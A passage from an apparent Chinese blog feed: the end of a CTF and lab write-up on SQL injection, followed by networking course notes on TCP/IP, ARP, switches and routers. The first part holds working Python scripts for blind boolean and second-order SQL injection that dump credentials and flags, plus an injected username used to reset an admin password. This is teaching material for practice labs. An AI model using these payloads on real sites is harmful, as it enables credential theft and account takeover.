&quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot; limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_p+<span class="string">&quot;,1))=&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                    r = requests.get(pass_url)</span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                        pword += <span class="built_in">chr</span>(<span class="built_in">int</span>(mid))</span><br><span class="line">                        <span class="built_in">print</span>(<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;| password：&quot;</span>+pword)</span><br><span class="line">                        p = p+<span class="number">1</span></span><br><span class="line">                        low = <span class="number">32</span></span><br><span class="line">                        high = <span class="number">126</span></span><br><span class="line">                    <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        pass_url = url + <span class="string">&quot;and ascii(substr((select password from &quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot; limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_p+<span class="string">&quot;,1))&gt;&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                        r = requests.get(pass_url)</span><br><span class="line">                        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                            low = mid</span><br><span class="line">                        <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                            high = mid</span><br><span class="line">                password[<span class="built_in">str</span>(j)] = <span class="built_in">str</span>(pword)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">13</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;|&quot;</span>+<span class="built_in">str</span>(x+<span class="number">1</span>)+<span class="string">&quot;|username:&quot;</span>+username[<span class="built_in">str</span>(x)]+<span class="string">&quot;|password:&quot;</span>+password[<span class="built_in">str</span>(x)]+<span class="string">&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#程序入口</span></span><br><span class="line"><span class="keyword">if</span>(__name__==<span class="string">&quot;__main__&quot;</span>):</span><br><span class="line">    url = <span class="string">&quot;http://38.147.173.118:81/Less-7/?id=1&#x27;)) &quot;</span></span><br><span class="line">    flag = <span class="string">&quot;You are in&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;..........开始猜解当前数据库库名长度..........&quot;</span>)</span><br><span class="line">    db_len = db_length()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n............开始猜解当前数据库库名............&quot;</span>)</span><br><span class="line">    db_name = db_name()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n.............开始判断数据表的个数.............&quot;</span>)</span><br><span class="line">    table_num = table_num()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n...............开始判断表名长度...............\n&quot;</span>)</span><br><span class="line">    t_len = table_len()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n.................开始猜解表名.................\n&quot;</span>)</span><br><span class="line">    tname = table_name()</span><br><span class="line">    table_name = <span class="built_in">input</span>(<span class="string">&quot;\n请选择一张表：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n.............开始判断表中列的个数.............\n&quot;</span>)</span><br><span class="line">    column_num = column_num()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n...............开始判断列名长度...............\n&quot;</span>)</span><br><span class="line">    column_len = column_len()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n.................开始猜解列名.................\n&quot;</span>)</span><br><span class="line">    cname = column_name()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n................开始判断字段数................\n&quot;</span>)</span><br><span class="line">    dump_num = dump_num()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n...............开始判断字段长度...............\n&quot;</span>)</span><br><span class="line">    user_len,pass_len = dump_len()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n................开始猜解字段值................\n&quot;</span>)</span><br><span class="line">    dump()</span><br></pre></td></tr></table></figure><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者即使对用户输入的恶意数据进行转义，当数据插入到数据库中时被处理的数据又被还原，Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就会发生SQL二次注入，即Web程序将我们书写的恶意代码当作数据存入数据库中，当数据被调用的时候就会执行这一串代码，从而返回我们需要的数据，造成二次注入。两次注入分别是<strong>插入恶意数据</strong>、<strong>利用恶意数据</strong></p><p>所以如果想要造成二次注入，就要满足下面的两个条件即可</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">用户可以向数据库插入恶意数据，即使后端对语句进行了转义</span><br><span class="line">数据库可以将恶意数据取出</span><br></pre></td></tr></table></figure><h4 id="unfinish"><a href="#unfinish" class="headerlink" title="unfinish"></a>unfinish</h4><p>我们接下来以一道CTF题为例子，便于大家理解二次注入，这里我们使用BUUCTF上的unfinish作为例子</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240724165325073.png" alt="image-20240724165325073"></p><p>我们首先可以看到一个登录界面，但是我们没找到注册的功能点在哪，试了一下弱密码，应该也是不行的，所以我们先扫一扫后门网站，看看是不是隐藏了注册网站，果然存在<code>register.php</code>的后门网站，我们先随便注册一个用户，随后我们发现此网站通过邮箱来取出用户名，这里可能存在二次注入</p><p>我们可以这样进行测试，在用户名处写下注入语句<code>1&#39; and &#39;0</code>，我们可以发现我们的用户名确实变成了0，也就是说确实存在二次注入</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240724171115196.png" alt="image-20240724171115196"></p><p>由于是二次注入，所以我们也不好直接猜字段数，所以我们试着用asscii码来一位一位的爆出数据，我们在username中输入<code>0&#39;+ascii(substr(database() from 1 for 1))+0&#39;</code>，为什么使用<code>from 1 for 1</code>，是因为逗号被禁用了，所以可以使用这种方法来绕过逗号</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240724171949120.png" alt="image-20240724171949120"></p><p>接下来就是写一个python脚本进行跑flag了，由于information也被禁用了，所以这里也只能猜测表名为flag了，对应的脚本如下所示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ad987641-a4b8-4746-924b-12e81a6398c8.node5.buuoj.cn:81/&#x27;</span></span><br><span class="line">url1 = url+<span class="string">&#x27;register.php&#x27;</span></span><br><span class="line">url2 = url+<span class="string">&#x27;login.php&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line">    data1 = &#123;<span class="string">&quot;email&quot;</span> : <span class="string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="built_in">format</span>(i), <span class="string">&quot;username&quot;</span> : <span class="string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;</span>.<span class="built_in">format</span>(i), <span class="string">&quot;password&quot;</span> : <span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">    data2 = &#123;<span class="string">&quot;email&quot;</span> : <span class="string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="built_in">format</span>(i), <span class="string">&quot;password&quot;</span> : <span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">    r1 = requests.post(url1, data=data1)</span><br><span class="line">    r2 = requests.post(url2, data=data2)</span><br><span class="line">    res = re.search(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>,r2.text)</span><br><span class="line">    res1 = re.search(<span class="string">r&#x27;\d+&#x27;</span>, res.group())</span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(<span class="built_in">int</span>(res1.group()))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;final:&quot;</span>+flag)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240724175921198.png" alt="image-20240724175921198"></p><p>我们可以看到flag已经被解出来了，到这里我们的二次注入就写完了</p><h4 id="sqli-lab第24关"><a href="#sqli-lab第24关" class="headerlink" title="sqli-lab第24关"></a>sqli-lab第24关</h4><p>首先拿到页面，也是只有一个登录框</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240724212222351.png" alt="image-20240724212222351"></p><p>所以我们果断选择创建一个新用户，如下所示，发现admin用户已经存在了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240724212445554.png" alt="image-20240724212445554"></p><p>当我们用正常的用户名和密码登录时，会在主页面上显示我们的用户名，这里就存在二次注入了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240724212719359.png" alt="image-20240724212719359"></p><p>我们可以修改admin的密码（因为当我们登录进去之后，会有让我们修改密码的界面），进而达到越权</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240724215301088.png" alt="image-20240724215301088"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240724215523354.png" alt="image-20240724215523354"></p><p>当更新密码的时候，后台语句为<code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39;</code>，当插入后，就会变成</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;UPDATE users SET PASSWORD=&#x27;1234&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27;</span><br></pre></td></tr></table></figure><p>进而达到任意账号修改，admin账户登录成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240724215935268.png" alt="image-20240724215935268"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-TCP&amp;IP&amp;MAC</title>
      <link href="/post/3ec99e92.html"/>
      <url>/post/3ec99e92.html</url>
      
        <content type="html"><![CDATA[<h2 id="可靠传输——TCP"><a href="#可靠传输——TCP" class="headerlink" title="可靠传输——TCP"></a>可靠传输——TCP</h2><p>HTTP是基于TCP协议传输的，TCP协议是一种可靠的传输，HTTP之所以要用到TCP协议而不使用UDP协议，也很简单，设想一下如果你在上网的时候页面发生缺失，或者图片缺失，很难受对不对，所以要使用可靠传输来保证我们上网的体验感，所以我们先来了解一下TCP协议</p><h3 id="TCP包头格式"><a href="#TCP包头格式" class="headerlink" title="TCP包头格式"></a>TCP包头格式</h3><p>TCP报文首部格式如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240430104607823.png" alt="image-20240430104607823"></p><p>首先<strong>源端口号</strong>和<strong>目的端口号</strong>是必不可少的，有了这两个端口号，数据包才知道从哪里来，要到哪里去</p><p>接下来<strong>序号</strong>也是必不可少的，序号是包的序号，这个是为了解决包乱序的问题，给包编上序号，就不会弄混啦😁😁😁</p><p>然后就是<strong>确认号</strong>，目的是为了确认发出去的对方是否有收到，如果没有收到就应该重新发送，直到送达，这个是为了解决丢包问题</p><p>接下来就是一些<strong>状态位</strong>，SYN是发起一个连接，ACK是回复，RST是重新连接，FIN是结束连接等等。因为TCP是面向连接的，因而双方需要维护连接的状态，这些状态位的发送，会引起双方状态的变更</p><p>紧接着就是<strong>窗口大小</strong>，因为TCP承担着<strong>流量控制</strong>的责任，所以在通信的过程中，通信双方各声明一个窗口（缓存大小），标识自己当前能够处理的能力，别发送的太多太快，也别发送的太少太慢；除了流量控制以外，TCP还会做<strong>拥塞控制</strong>，对于传输信道上到底堵不堵，它无能为力，唯一能做的只有控制自己，即控制发送的速度，做到拥塞控制</p><h3 id="TCP的三次握手"><a href="#TCP的三次握手" class="headerlink" title="TCP的三次握手"></a>TCP的三次握手</h3><p>在HTTP传输数据之前，首先要建立TCP连接，TCP连接的建立，通常需要<strong>三次握手</strong>，这个所谓的连接，只是双方计算机里维护的一个状态机，在连接建立的过程中，双方的时序图如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240430115145454.png" alt="image-20240430115145454"></p><ul><li>一开始，客户端和服务端都处于CLOSED状态，首先是服务器主动监听某个端口，处于LISTEN状态</li><li>然后客户端主动发起连接SYN，之后处于SYN-SENT状态</li><li>服务端收到发起的连接，返回SYN，并且ACK客户端的SYN，之后处于SYN-RCVD状态</li><li>客户端收到服务器发送的SYN和ACK之后，发送对SYN确认的ACK，之后处于ESTABLISHED状态，因为它一发一收成功了，处于就绪状态</li><li>服务端收到ACK的ACK后，处于ESTABLISHED状态，因为它也一发一收成功了</li></ul><mark class="hl-label purple">三次握手的目的是保证双方都有发送和接受的能力</mark> <h3 id="TCP分割数据"><a href="#TCP分割数据" class="headerlink" title="TCP分割数据"></a>TCP分割数据</h3><p>如果HTTP请求消息比较长，超过MSS的长度，这是TCP就需要把HTTP的数据拆解成一块块的数据发送，而不是一次性发送所有的数据</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240430132023369.png" alt="image-20240430132023369"></p><ul><li>MTU：一个网络包的最大长度，以太网一般为1500字节</li><li>MSS：除去IP和TCP头部之后，一个网络包所能容纳的TCP数据的最大长度</li></ul><p>数据会被以MSS的长度为单位进行拆分，拆分出来的每一块数据都会被放入单独的网络包中。也就是在每个被拆分的数据加上TCP头信息，然后交给IP模块来发送数据</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240430143344590.png" alt="image-20240430143344590"></p><h3 id="TCP报文生成"><a href="#TCP报文生成" class="headerlink" title="TCP报文生成"></a>TCP报文生成</h3><p>TCP协议里面会有两个端口，一个是浏览器监听的端口（通常是随机生成的），一个是Web服务器监听的端口（HTTP默认端口号是80，HTTPS默认端口号是443）</p><p>在双方建立连接后，TCP报文中的数据部分就是存放HTTP头部+数据，组装好TCP报文之后，就交给下面的网络层处理</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240430144543022.png" alt="image-20240430144543022"></p><p>至此HTTP数据包成功发送出去了，但是该怎么知道该往哪走呢？</p><h2 id="远程定位——IP"><a href="#远程定位——IP" class="headerlink" title="远程定位——IP"></a>远程定位——IP</h2><p>TCP模块在执行连接、收发、断开等各阶段操作时，都需委托IP模块将数据封装成网络包发送给通信对象</p><h3 id="IP包头格式"><a href="#IP包头格式" class="headerlink" title="IP包头格式"></a>IP包头格式</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240430144950991.png" alt="image-20240430144950991"></p><p>首先也是要有<strong>源地址IP</strong>和<strong>目标地址IP</strong>：</p><ul><li><p>源地址IP：客户端输出的IP地址</p></li><li><p>目标地址：通过DNS域名解析得到的Web服务器IP</p></li></ul><p>因为HTTP是通过TCP进行传输的，所以在IP包头的协议号，要填写06（D），表示为TCP协议</p><p>当存在多个网卡时，一台主机就会有多个IP地址，这个时候需要判断到底应该填写哪个地址，即使用哪一个网卡来进行发包</p><p>这个时候就要用到<strong>路由表规则</strong>，来判断哪一个网卡作为源地址IP，路由表规则即拿IP地址和子网掩码进行与（&amp;）运算，得到一个结果，拿去和本机Destination进行比较，匹配不一致，则失败，匹配成功，则使用该网卡的IP地址作为IP包头的源地址，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240510084848049.png" alt="image-20240510084848049"></p><p>这是有了IP协议，知道了从哪来，该到哪去，但是要怎么去呢？下一站该去哪呢？</p><h2 id="两点传输——MAC"><a href="#两点传输——MAC" class="headerlink" title="两点传输——MAC"></a>两点传输——MAC</h2><p>生成了IP头部后，接下来网络包还需要在IP头部的前面加上<strong>MAC头部</strong></p><p>MAC头部是以太网使用的头部，它包含了接收方和发送方的MAC地址等信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240510085351565.png" alt="image-20240510085351565"></p><p>MAC包里面需要<strong>发送方MAC地址</strong>和<strong>接收方目标MAC地址</strong>，用于两点间的传输</p><p>在TCP/IP通信里，MAC包头的协议类型只使用：</p><ul><li>0800：IP协议</li><li>0806：ARP协议</li></ul><p>发送方的MAC地址获取比较简单，MAC地址是在网卡生产时写入到ROM里的，只要将这个值读取出来写入到MAC头部就可以了</p><p>接收方获取MAC地址有点复杂，首先得先弄清楚要发给谁，这个在前面已经讨论过了，查一下路由表就行了，但是这只知道IP地址，如何获取MAC地址呢？</p><p>此时就要用到ARP协议帮我们找到路由器的MAC地址，ARP协议会在以太网中以广播的形式，对以太网的所有设备喊出：“这个IP地址是谁的？把你的MAC地址告诉我。”</p><p>然后就会有主机进行回应：“这个IP是我的，我的MAC地址是xxxx”。</p><p>如果对方和自己处于一个子网中，那么通过上面的操作就可以得到对方的MAC地址，然后我们将MAC地址写入MAC头部中，MAC头部就完成了</p><p>但是每次都进行这种广播操作，不是很麻烦吗？这个时候，操作系统会把本次查询的查询结果放在一块叫做ARP缓存的内存空间留着以后使用，不过缓存的时间只有几分钟</p><p>至此，网络包的报文如下图</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240510092623930.png" alt="image-20240510092623930"></p><p>至此，所有准备工作已经完成，终于要出门了</p><h3 id="出口——网卡"><a href="#出口——网卡" class="headerlink" title="出口——网卡"></a>出口——网卡</h3><p>网络包只是存放在内存中的一串二进制数字信息，没有办法直接发送给对方，因此我们需要将数字信号转化为电信号，才能在网线上传输</p><p>负责执行这一操作的是<strong>网卡</strong>，要控制网卡还得靠<strong>网卡驱动程序</strong></p><p>网卡驱动获取网络包后，会将其复制到网卡内的缓存区中，接着会在其开头加上<strong>报头和起始帧分界符</strong>，在末尾加上<strong>用于检测错误的帧校验序列</strong></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240510093242951.png" alt="image-20240510093242951"></p><ul><li>起始帧分界符是一个用来表示包起始位置的标记</li><li>末尾的FCS用来检测包在传输的过程中是否有损坏</li></ul><p>最后网卡会将数据包转换为电信号，通过网线发送出去</p><h3 id="送别者——交换机"><a href="#送别者——交换机" class="headerlink" title="送别者——交换机"></a>送别者——交换机</h3><p>交换机的设计是将网络包原样转发到目的地，交换机工作在MAC层，也称<strong>二级网络设备</strong></p><p>首先，电信号到达网线接口，交换机里的模块进行接收，接下来交换机里的模块将电信号转换为数字信号</p><p>然后通过包末尾的FCS校验错误，如果没问题就放到缓冲区，这部分操作基本和计算机的网卡相同，但交换机的工作方式和网卡不同。</p><p>将包存入缓冲区后，接下来要查询一下这个包的接收方MAC地址是否已经在MAC地址表中有记录了</p><p>交换机的MAC地址表主要包含两个信息：</p><ul><li>设备的MAC地址</li><li>该设备连接在交换机的哪个端口上</li></ul><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240510094923224.png" alt="image-20240510094923224"></p><p>举个例子，如果收到的包的接收方MAC地址为<code>00-00-C0-16-AE-FD</code>，则根据MAC地址表，知道这个地址位于<code>2</code>号端口上，然后通过交换电路将包发送到相应的端口</p><p>当MAC地址表中找不到指定的MAC地址的时候，可能是因为具有该地址的设备还没有向交换机发送过包，或者有一段时间没工作导致从地址表中删除了</p><p>这时候，交换机无法判断该转发到哪个端口上，只能将数据包转发到除了源端口之外的所有端口，无论该设备连接在哪个端口上都能接收到这个包。只有相应的接收者接到包之后才会进行处理，而其他设备则会忽略这个包，不对这个包作出相应应答</p><p>那这样不是会造成网络拥塞吗？完全不用担心这个问题，因为只有目标设备会做出响应，只要发回了响应包，交换机就可以把它的地址写入MAC地址表，下次就不需要把包发往所有端口了。而且换句话来说，数据包在网络通信过程中广播的次数很多，所以多进行一次这样的操作并没有什么很大的问题</p><p>以下两个是常见的广播地址</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">MAC地址中：FF-FF-FF-FF-FF-FF</span><br><span class="line">IP地址中：255.255.255.255</span><br></pre></td></tr></table></figure><h3 id="出境大门——路由器"><a href="#出境大门——路由器" class="headerlink" title="出境大门——路由器"></a>出境大门——路由器</h3><p>有一个非常形象的比喻，路由器就像是在每一个路口上为你决策往哪个方向走的导航一样。对于数据包来说，路由器帮助每一个数据包选择不同的路线来帮助他们更好地到达目的地。路由器也是通过转发的方式转发到下一个路由器或者目标设备，这一步的工作原理和交换机类似，通过查表判断包转发的目标，但是路由器和交换机在构造上有一定的区别，主要表现在：</p><ul><li>路由器是基于IP设计的，俗称三级网络设备，路由器的每个端口都有相应的MAC地址和IP地址</li><li>交换机是基于以太网设计的，俗称二级网络设备，交换机的端口不具有MAC地址</li></ul><blockquote><p>路由器的包接受操作</p></blockquote><p>首先，电信号到达网线接口处，路由器中的模块会将电信号转化成数字信号，然后通过包末尾的 FCS 进行差错检测；如果没问题则检查MAC头部接收方MAC地址，看看是不是发给自己的包，如果是就放在接收方缓冲区中，否则丢弃这个包</p><blockquote><p>确定输出端口</p></blockquote><p>完成包接受操作后，路由器会去掉包开头的MAC头部，因为此时MAC头部的任务已经完成，于是MAC头部被丢弃，接下来，路由器会根据MAC头部后方的IP头部中的内容进行包的转发操作，转发分为几个阶段，首先就是查询路由表判断转发目标，如下是路由表的示例图</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240706135652522.png" alt="image-20240706135652522"></p><p>例如10.10.1.101向192.168.1.100转发消息时，首先将目标IP和子网掩码进行&amp;运算，得到结果为192.168.1.0，与路由表中第二天符合，所以路由器将这条数据包从eth3发出去，如果路由表中无相关条目，则通过默认路由转发，其中0.0.0.0表示默认路由</p><blockquote><p>路由器发送操作</p></blockquote><p>首先要根据路由表的网关列来判断对方的地址。</p><ul><li>如果网关是一个IP地址，则这个IP地址就是我们需要转发到的目标地址，且还未抵达终点，还需继续由路由器转发</li><li>如果网关为空，则IP头部的接收方IP地址就是要转发到的目标地址，说明已抵达终点</li></ul><p>知道对方的IP地址后，通过ARP协议根据IP地址查询MAC地址，并将查询的结果作为接收方的MAC地址（路由器中也有APR缓存，会优先在ARP缓存中查询，如果找不到则发送ARP查询请求）</p><p>网络包完成后，接下来会将其转化为电信号并通过端口发送出去，这一步的工作过程和计算机是相同的。</p><p>发送出去的网络包会通过交换机到达下一个路由器，由于接收方MAC地址是下一个路由器的地址，所以交换机会根据这一地址将包传输到下一个路由器，接下来下一个路由器再转发到下一个路由器，经过层层转发后，网络包就到达了最终的目的地</p><p>在数据包的转发过程中，一直在变化的是MAC地址，源IP和目的IP都不会发生变化，因此在两个设备间进行传输，MAC地址更为重要</p><h2 id="服务器和客户端"><a href="#服务器和客户端" class="headerlink" title="服务器和客户端"></a>服务器和客户端</h2><p>以下是数据包在服务器和客户端之间传递的过程中数据包的形态变换情况</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240706142128557.png" alt="image-20240706142128557"></p><p>数据包到达服务器后，服务器先扒开数据包的MAC头部，查看是否与自己的MAC地址相符合，符合则接受包</p><p>接着继续拆开IP头部，发现IP地址符合，根据IP头中的协议号，知道自己上层是TCP协议</p><p>于是，打开TCP的头部，里面有序列号，需要看一眼这个序列号是不是想要的，如果是就放入缓存并返回一个ACK，如果不是就丢弃。TCP头部还有端口号，HTTP的服务器正在监听这个端口号，于是服务器知道HTTP进程需要这个包，于是就把包发给HTTP进程</p><p>服务器的HTTP进程看到，这个请求需要访问一个页面，于是就把这个页面封装在HTTP响应报文</p><p>接着HTTP响应报文依次套上TCP、IP、MAC头部，再发送回去</p><p>最后，客户端经过四次挥手和服务器进行连接断开</p>]]></content>
      
      
      <categories>
          
          <category> 学校课程 </category>
          
          <category> 计算机网络 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> TCP协议 </tag>
            
            <tag> IP协议 </tag>
            
            <tag> MAC协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-TCP/IP模型&amp;HTTP</title>
      <link href="/post/7c3ce4f0.html"/>
      <url>/post/7c3ce4f0.html</url>
      
        <content type="html"><![CDATA[<h2 id="TCP-IP网络模型概述"><a href="#TCP-IP网络模型概述" class="headerlink" title="TCP/IP网络模型概述"></a>TCP/IP网络模型概述</h2><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>我们能直接接触到的就是应用层，我们手机和电脑使用的应用软件都是在应用层实现的</p><p>应用层只需要专注于为用户提供应用功能，如HTTP、FTP、Telnet、DNS、SMTP等等</p><p>应⽤层是⼯作在操作系统中的<strong>⽤户态</strong>，传输层及以下则⼯作在<strong>内核态</strong></p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>传输层有两个协议，分别是TCP和UDP</p><p>TCP 的全称叫传输控制协议（Transmission Control Protocol），⼤部分应⽤使⽤的正是 TCP传输层协议，⽐如 HTTP 应⽤层协议。TCP 相⽐  UDP 多了很多特性，⽐如流量控制、超时重传、拥塞控制等，这些都是为了保证数据包能可靠地传输给对⽅</p><p>UDP相对来讲就很简单，只负责发送数据包，不保证数据包是否能抵达对方，但是实时性更好，传输效率也更高。当然UDP也可以实现可靠传输，把TCP的特性在应用层上实现就可以</p><p>应用需要传输的数据可能会非常大，直接全部传输不是很好控制，因此当传输层的数据包大小超过MSS（TCP最大报文段长度），就要将数据包分块，这样即使在传输的过程中发生丢包，也只需要重新传输这一个分块，而不需要重新发送整个数据包，每个分块被称为一个<strong>TCP段</strong></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426093814283.png" alt="image-20240426093814283"></p><p>当设备作为接收⽅时，传输层则要负责把数据包传给应⽤，但是⼀台设备上可能会有很多应⽤在接收或者传输数据，因此需要⽤⼀个编号将应⽤区分开来，这个编号就是<strong>端⼝</strong>，传输层的报文中会携带端口号，因此接收方可以识别出该报文是发送给哪个应用的</p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>传输层并不负责数据从一个设备传输到另一个设备上，实际场景中的⽹络环节是错综复杂的，中间有各种各样的线路和分叉路⼝，如果⼀个设备的数据要传输给另⼀个设备，就需要在各种各样的路径和节点进⾏选择，⽽传输层的设计理念是简单、⾼效、专注，如果传输层还负责这⼀块功能就有点违背设计原则了，也就是说，我们不希望传输层协议处理太多的事情，只需要服务好应用即可，传输层只作为应用间的数据传输媒介，帮助实现应用到应用的通信，实际传输功能交给网络层</p><p>⽹络层最常使⽤的是 IP 协议（Internet Protocol），IP 协议会将传输层的报⽂作为数据部分，再加上 IP 包头组装成 IP 报⽂，如果 IP 报⽂⼤⼩超过 MTU（以太⽹中⼀般为 1500 字节）就会再次进⾏分⽚，得到⼀个即将发送到⽹络的 IP 报⽂。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426094501034.png" alt="image-20240426094501034"></p><p>网络层负责将数据从一个设备传输到另一个设备，世界上那么多设备，如何快速找到对方呢？因此，网络层需要有区分设备的编号</p><p>我们一般用IP地址给设备进行编号，对于IPv4协议，IP地址共32位，分成四段（比如192.168.132.00），每段是8位，从0-255。但是只有单纯的IP地址虽然做到了区分设备，但是寻址起来特别麻烦，全世界那么多设备，不可能做到一个个设备去匹配的，因此，IP地址有以下两种意义：</p><ul><li>一个是<strong>网络号</strong>，负责标识该IP地址是属于哪个子网的</li><li>一个是<strong>主机号</strong>，负责标识同一子网下的不同主机</li></ul><p>怎么分的呢？这需要配合<strong>⼦⽹掩码</strong>才能算出IP地址的⽹络号和主机号。举个例⼦，⽐如 10.100.122.0/24，后⾯的/24表示就255.255.255.0 ⼦⽹掩码，255.255.255.0 ⼆进制是「11111111-11111111-11111111-00000000」，是 24 个1，为了简化⼦⽹掩码的表示，⽤/24代替255.255.255.0</p><p>知道了⼦⽹掩码，该怎么计算出⽹络地址和主机地址呢？</p><p>将10.100.122.2和255.255.255.0进行按位与运算，就可以得到网络号</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426095417751.png" alt="image-20240426095417751"></p><p>将255.255.255.0取反后与IP地址进行按位与运算，就可以得到主机号</p><p>寻址过程中，先匹配到相同的网络号（表示要找到同一个子网），才会找到相应的主机</p><p>除了寻址能力，IP协议还有另一个重要的能力就是路由，实际场景中，两台设备并不是用一条网线连接起来的，而是通过很多网关、路由器、交换机等众多设备连接起来的，所以会形成很多条网络的路径，因此当数据包到达一个网络结点，就要通过路由算法决定下一步走哪条路径，路由器寻址工作中，就是要找到目标地址的子网，找到后进而把数据包转发给对应的网络内</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426105245681.png" alt="image-20240426105245681"></p><p>所以，IP协议的寻址作用是告诉我们下一个目的地该朝哪个方向走，路由则是根据下一个目的地选择路径，寻址更像导航，路由更像操作方向盘</p><h3 